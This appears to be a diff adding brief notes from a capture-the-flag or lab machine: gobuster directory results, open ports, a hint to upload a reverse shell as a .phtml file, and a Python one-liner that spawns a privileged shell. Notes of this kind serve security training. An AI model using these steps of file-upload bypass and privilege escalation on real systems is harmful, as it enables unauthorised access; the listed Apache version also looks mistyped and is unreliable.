@@ -1,0 +1,22 @@
+gobuster res
+
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.218.42/css/]
+/index.php            (Status: 200) [Size: 616]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.218.42/js/]
+/panel                (Status: 301) [Size: 312] [--> http://10.10.218.42/panel/]
+/server-status        (Status: 403) [Size: 277]
+/uploads              (Status: 301) [Size: 314] [--> http://10.10.218.42/uploads/]
+
+Nmap:
+22 - ssh 
+80 - apache 2.8.29
+
+
+send rev shell .phtml
+(don't forget to turn off firewall)
+
+
+python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
